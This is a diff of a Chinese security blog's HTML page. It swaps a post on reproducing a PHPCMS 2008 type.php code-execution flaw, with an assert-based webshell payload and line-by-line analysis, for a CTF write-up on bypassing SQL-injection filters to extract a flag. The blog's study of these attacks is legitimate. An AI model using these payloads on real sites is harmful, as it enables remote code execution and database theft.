@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>phpcms2008 type.php代码执行漏洞分析与复现 · c1ay&#39;s blog</title>
+    <title>ctf记录-记一次有趣的注入 · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >c1ay&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">phpcms2008 type.php代码执行漏洞分析与复现</a>
+                <a href="#" class="post-name">ctf记录-记一次有趣的注入</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            phpcms2008 type.php代码执行漏洞分析与复现
+            ctf记录-记一次有趣的注入
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.3k</span>Reading time: <span class="post-count reading-time">5 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">707</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/11/06</span>
+                    <span class="post-intro-time">2019/11/03</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,65 +401,50 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="phpcms2008-type-php代码执行漏洞分析与复现"><a href="#phpcms2008-type-php代码执行漏洞分析与复现" class="headerlink" title="phpcms2008 type.php代码执行漏洞分析与复现"></a>phpcms2008 type.php代码执行漏洞分析与复现</h1><h3 id="phpcms2008安装问题："><a href="#phpcms2008安装问题：" class="headerlink" title="phpcms2008安装问题："></a>phpcms2008安装问题：</h3><p><strong>安装时出现如下错误</strong><br><img src="http://pic.c1imber.top/blog/20181221/QpCFWTtDJwoh.png" alt="mark"></p>
-<p><strong>修改以下文件”TYPE=MyISAM”处，修改为”ENGINE=MyISAM”</strong></p>
-<p><strong>php文件：</strong></p>
-<pre><code>/ads/include/create.table.php
-/install.php
-/include/admin/global.func.php
-/include/admin/sql.func.php
-/install/install.php
-</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/ymb5x1PwgDpL.png" alt="mark"><br><strong>以及所有的.sql文件，”TYPE=MyISAM”修改为”ENGINE=MyISAM”</strong><br><img src="http://pic.c1imber.top/blog/20181221/4nP9Llvw7Ml6.png" alt="mark"><br><strong>就可以安装成功了</strong><br><img src="http://pic.c1imber.top/blog/20181221/CrNRV2k4Fgqh.png" alt="mark"></p>
-<h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p><strong>payload:</strong></p>
-<p><strong>在存在漏洞的网站后输入：</strong></p>
-<pre><code>type.php?template=tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss
-</code></pre><p><img src="http://pic.c1imber.top/blog/20181221/OvkOxH3tP93B.png" alt="mark"><br><strong>之后将会在/data/cache_template/目录下生成rss.tpl.php文件，template的值被成功写入到该文件内，产生任意代码执行</strong></p>
-<p><strong>接着访问：</strong></p>
-<pre><code>/data/cache_template/rss.tpl.php?1=phpinfo();
-</code></pre><p><strong>即可执行phpinfo()</strong><br><img src="http://pic.c1imber.top/blog/20181221/U65J6DwPpbsA.png" alt="mark"></p>
-<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><strong>根据payload可知入口点在type.php,重要代码如下：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</div><div class="line">......</div><div class="line"><span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</div></pre></td></tr></table></figure>
-<p><strong>其中$tamplate参数可控</strong></p>
-<p><strong>下面来看/include/common.inc.php</strong></p>
-<p><strong>重要代码如下：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_REQUEST)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(MAGIC_QUOTES_GPC)</div><div class="line">	&#123;</div><div class="line">		$_REQUEST = new_stripslashes($_REQUEST);</div><div class="line">		<span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</div><div class="line">		extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		$_POST = $db-&gt;escape($_POST);</div><div class="line">		$_GET = $db-&gt;escape($_GET);</div><div class="line">		$_COOKIE = $db-&gt;escape($_COOKIE);</div><div class="line">		@extract($_POST,EXTR_SKIP);</div><div class="line">		@extract($_GET,EXTR_SKIP);</div><div class="line">		@extract($_COOKIE,EXTR_SKIP);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</div><div class="line">	<span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><strong>以上的代码可用来接收传入的template，其中extract函数会对传入的GPC关联数组当中的键值对进行变量注册，其中EXTR_SKIP参数表示当变量名冲突时，不覆盖原有变量，所以当在GPC当中传入template参数时，传入的值会作为参数传入include template(‘phpcms’, $template)这里，跟进相关的函数，代码如下：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">	<span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</div><div class="line">		template_compile($module, $template, $istag);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $compiledtplfile;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><strong>其中</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">'TPL_CACHEPATH'</span>, PHPCMS_ROOT.<span class="string">'data/cache_template/'</span>); <span class="comment">//模板缓存物理路径</span></div><div class="line">define(<span class="string">'TPL_ROOT'</span>, PHPCMS_ROOT.<span class="string">'templates/'</span>); <span class="comment">//模板保存物理路径</span></div><div class="line">define(<span class="string">'TPL_NAME'</span>, <span class="string">'default'</span>); <span class="comment">//当前模板方案目录</span></div></pre></td></tr></table></figure>
-<p><strong>代码将传入的$template经过拼接后赋值给$compiledtplfile,此时$compiledtplfile的值变为了：</strong></p>
-<pre><code>/data/cache_template/phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.tpl.php
-</code></pre><p><strong>这里的payload构造很有想象力，里这巧妙了利用了一个目录穿越的技巧，所以会将<code>phpcms_tag_(){};@unlink(_FILE_);assert($_GET[1]);{/</code>看成是一个目录，接着<code>../</code>则会跳过该目录</strong></p>
-<p><strong>之后将路径传入file_exists检查文件是否存在，这里检查的文件路径实际上为：</strong></p>
-<pre><code>/data/cache_template/rss.tpl.php
-</code></pre><p><strong>其中TPL_REFRESH为默认值1，并且/data/cache_template/rss.tpl.php这个文件是不存在的，所以符合条件，接着$tamplate被传入<code>template_compile($module, $template, $istag);</code>，跟进对应的函数</strong></p>
-<p><strong>代码如下：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	$tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</div><div class="line">	$content = @file_get_contents($tplfile);</div><div class="line">	<span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span class="string">"$tplfile is not exists!"</span>);</div><div class="line">	$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</div><div class="line">	$content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</div><div class="line">	$strlen = file_put_contents($compiledtplfile, $content);</div><div class="line">	@chmod($compiledtplfile, <span class="number">0777</span>);</div><div class="line">	<span class="keyword">return</span> $strlen;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><strong>此时$temlate经过拼接赋值给了$tplfile，$tpfile的值变为了：</strong></p>
-<pre><code>/templates/default/phpcms/tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss.html
-</code></pre><p><strong>之后<code>file_get_contents</code>会读取$tpfle这个文件的内容，如果文件不存在就会直接结束执行，但是这里的路径同样存在目录穿越的问题，实际上读取的路径为/templates/default/phpcms/rss.html这个文件，而这个文件是存在的，此处利用了路径穿越巧妙的绕过了此处的检查，之后<code>template_parse</code>函数将$tplfile文件当中的html代码编译成为php代码，然后和$template变量的内容拼接后写入到了$compiledtplfile这个文件中，也就是/data/cache<em>template/rss.tpl.php这个文件，这里要求template的前四个字符为`tag</em>`，payload的构造符合了要求，这时候php恶意代码就成功写入到了模板缓存文件内，产生了代码执行</strong></p>
-<p><strong>写入的/data/cache_template/rss.tpl.php内的恶意代码为：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">_tag_phpcms_tag_</span><span class="params">()</span></span>&#123;&#125;;@unlink(_FILE_);assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);<span class="meta">?&gt;</span>'.template_parse($content, 1).'<span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure>
-<p><img src="http://pic.c1imber.top/blog/20181221/nFxXup4DpuRj.png" alt="mark"></p>
-<h3 id="关于payload构造的几个问题："><a href="#关于payload构造的几个问题：" class="headerlink" title="关于payload构造的几个问题："></a>关于payload构造的几个问题：</h3><p><strong>1.为什么加unlink？</strong></p>
-<p><strong>其实可以不加，仔细看的话可以看到此处的unlink里面的参数书写的也不对并不会执行，加unlink的原因只是为了语法正确而已，经过测试：</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tag_()&#123;&#125;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss也可以成功</span></div><div class="line">tag_()&#123;&#125;;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss会失败</span></div><div class="line">tag_()&#123;&#125;;php代码;assert($_GET[<span class="number">1</span>]);&#123;<span class="comment">//../rss成功</span></div></pre></td></tr></table></figure>
-<p><strong>2.为什么加//</strong></p>
-<p><strong>为了注释后面的代码，避免产生语法错误，不明白的可以看上图中的代码</strong></p>
-<p><strong>3.{这个符号</strong></p>
-<p><strong>因为后面的注释注释掉了{,所以需要加一个{去闭合代码最后的},否则会出语法错误</strong></p>
-<h3 id="ayload构造"><a href="#ayload构造" class="headerlink" title="ayload构造:"></a>ayload构造:</h3><p><strong>1.简化后的payload：</strong></p>
-<pre><code>type.php?template=tag_(){}assert($_GET[1]);{//../rss
-</code></pre><h3 id="漏洞总结："><a href="#漏洞总结：" class="headerlink" title="漏洞总结："></a>漏洞总结：</h3><p><strong>该漏洞可以总结为：代码根据传入的参数将/templates/default/phpcms目录下对应的.html模板文件渲染生成为/data/cache_template目录下.tpl.php模板缓存文件的这个过程中，由于输入是可控的，导致可以将php恶意代码写入php文件当中，从而产生任意代码执行</strong></p>
+        <h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p>
+<p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p>
+<p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p>
+<p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p>
+<p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p>
+<p>选择union注入的话，总结出需要突破的几个点：</p>
+<pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数
+2、注入不能使用逗号
+3、不能使用information_schema
+</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p>
+<p>突破1：</p>
+<p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p>
+<p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p>
+<pre><code>id=2&apos; union/**/select 1
+id=2&apos; union/**/select 1,2
+...    
+</code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p>
+<p>突破2：</p>
+<p>不能使用逗号，可以使用子查询绕过</p>
+<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23
+</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p>
+<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23
+</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p>
+<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23
+</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p>
+<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23
+</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p>
+<p>突破3：</p>
+<p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p>
+<p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p>
+<p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p>
+<p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p>
+<pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23
+</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p>
+<p>拖延症真的很可怕</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
-            <p>Author：<a href="https://c1aysec.github.io">c1ay</a>
-            <p>原文链接：<a href="https://c1aysec.github.io/2019/11/06/phpcms2008 type.php代码执行漏洞/">https://c1aysec.github.io/2019/11/06/phpcms2008 type.php代码执行漏洞/</a>
-            <p>发表日期：<a href="https://c1aysec.github.io/2019/11/06/phpcms2008 type.php代码执行漏洞/">November 6th 2019, 11:33:47 pm</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2019/11/06/phpcms2008 type.php代码执行漏洞/">December 21st 2018, 8:21:37 pm</a>
+            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/">https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/">November 3rd 2019, 10:29:00 am</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/">November 7th 2019, 1:11:00 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -467,12 +452,17 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/11/06/2019强网杯-过滤select的注入/" title= "2019强网杯-过滤select的注入">
+                    <div class="nextTitle">2019强网杯-过滤select的注入</div>
+                </a>
+            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/11/06/mssql盲注与dnslog的完美结合(命令执行)/" title= "渗透技巧-mssql盲注与dnslog的完美结合(命令执行)">
-                    <div class="prevTitle">渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</div>
+                <a href= "/2019/10/20/2019极客巅峰ctf记录/" title= "2019极客巅峰ctf记录">
+                    <div class="prevTitle">2019极客巅峰ctf记录</div>
                 </a>
             
         </li>
@@ -587,7 +577,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#phpcms2008-type-php代码执行漏洞分析与复现"><span class="toc-number">1.</span> <span class="toc-text">phpcms2008 type.php代码执行漏洞分析与复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpcms2008安装问题："><span class="toc-number">1.0.1.</span> <span class="toc-text">phpcms2008安装问题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用："><span class="toc-number">1.0.2.</span> <span class="toc-text">漏洞利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析："><span class="toc-number">1.0.3.</span> <span class="toc-text">漏洞分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于payload构造的几个问题："><span class="toc-number">1.0.4.</span> <span class="toc-text">关于payload构造的几个问题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ayload构造"><span class="toc-number">1.0.5.</span> <span class="toc-text">ayload构造:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞总结："><span class="toc-number">1.0.6.</span> <span class="toc-text">漏洞总结：</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf记录-记一次有趣的注入绕过"><span class="toc-number">1.</span> <span class="toc-text">ctf记录-记一次有趣的注入绕过</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -600,48 +590,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1448,32 +1396,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/phpcms2008 type.php代码执行漏洞/" >phpcms2008 type.php代码执行漏洞分析与复现</a>
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2019/11/03/ctf记录-记一次有趣的注入/" >ctf记录-记一次有趣的注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/mssql盲注与dnslog的完美结合(命令执行)/" >渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/2019极客巅峰ctf记录/" >2019极客巅峰ctf记录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/DDCTF2019 write up/" >DDCTF2019 write up</a>
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href= "/2019/04/18/DDCTF2019 write up/" >DDCTF2019 write up</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/ctf记录-记一次有趣的注入/" >ctf记录-记一次有趣的注入</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/2019极客巅峰ctf记录/" >2019极客巅峰ctf记录</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2019/05/28/2019强网杯-过滤select的注入/" >2019强网杯-过滤select的注入</a>
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2019/01/11/mssql盲注与dnslog的完美结合(命令执行)/" >渗透技巧-mssql盲注与dnslog的完美结合(命令执行)</a>
         </li>
     
     
@@ -1484,6 +1422,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2018/12/21/phpcms2008 type.php代码执行漏洞/" >phpcms2008 type.php代码执行漏洞分析与复现</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1728,6 +1671,29 @@ top:50vh;
         <li class="archive-post-item">
             <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2017/11/05/Some Words/" >第三届上海市大学生网络安全大赛注入题writeup</a>
         </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/11/06/2019强网杯-过滤select的注入/" >2019强网杯-过滤select的注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
     
     
         <li class="archive-post-item">
